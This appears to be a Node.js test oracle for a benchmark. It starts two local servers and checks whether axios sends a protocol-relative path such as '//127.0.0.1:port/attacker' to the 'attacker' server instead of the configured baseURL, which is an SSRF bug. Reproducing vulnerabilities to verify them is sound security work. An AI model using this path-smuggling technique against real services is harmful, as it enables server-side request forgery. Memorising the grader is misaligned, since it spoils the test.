'use strict';
const http = require('http');

function main() {
  const marker = 'AXIOS_SSRF_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  let axios;
  try {
    axios = require('axios');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    }));
    return;
  }

  const goodBody = 'GOOD_RESPONSE_' + marker;
  const badBody = 'BAD_RESPONSE_' + marker;

  const goodServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(goodBody);
  });

  const badServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(badBody);
  });

  function listen(server) {
    return new Promise((resolve, reject) => {
      server.listen(0, '127.0.0.1', () => resolve(server.address().port));
      server.on('error', reject);
    });
  }

  function closeAll() {
    try { goodServer.close(); } catch (e) {}
    try { badServer.close(); } catch (e) {}
  }

  function emit(result) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
  }

  (async () => {
    let goodPort, badPort;
    try {
      goodPort = await listen(goodServer);
      badPort = await listen(badServer);
    } catch (e) {
      closeAll();
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'setup failed: could not start local test servers: ' + (e && e.message)
      });
      return;
    }

    const instance = axios.create({
      baseURL: 'http://127.0.0.1:' + goodPort
    });

    // Benign operation: a normal relative path request to the good server.
    try {
      const benignResp = await instance.get('/some/normal/path');
      if (!benignResp || typeof benignResp.data !== 'string' || !benignResp.data.includes(goodBody)) {
        closeAll();
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not return expected good-server response'
        });
        return;
      }
      operation_completed = true;
    } catch (e) {
      closeAll();
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
      return;
    }

    // Malicious operation: a protocol-relative-looking path that, due to the
    // SSRF bug, gets redirected to an attacker-controlled host:port instead
    // of being treated as a path relative to baseURL.
    const maliciousPath = '//127.0.0.1:' + badPort + '/attacker';

    try {
      const resp = await instance.get(maliciousPath);
      const data = (resp && typeof resp.data === 'string') ? resp.data : '';
      if (data.includes(badBody)) {
        exploit_succeeded = true;
        evidence = 'Request intended for baseURL (' + goodPort + ') was instead routed to attacker host on port ' + badPort + '; response body matched attacker marker.';
      } else if (data.includes(goodBody)) {
        exploit_succeeded = false;
        evidence = 'Request correctly stayed scoped to baseURL server; attacker host was not reached.';
      } else {
        exploit_succeeded = false;
        evidence = 'Request completed but response matched neither known server; treated as not exploited. data=' + JSON.stringify(data).slice(0, 200);
      }
    } catch (e) {
      // Patched axios throws (e.g. Invalid URL) when it refuses to treat the
      // protocol-relative path as absolute in server (node) context.
      exploit_succeeded = false;
      evidence = 'malicious request was blocked/rejected: ' + (e && e.message);
    }

    closeAll();
    emit({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    });
  })().catch((e) => {
    closeAll();
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'unexpected top-level failure: ' + (e && e.message)
    });
  });
}

main();
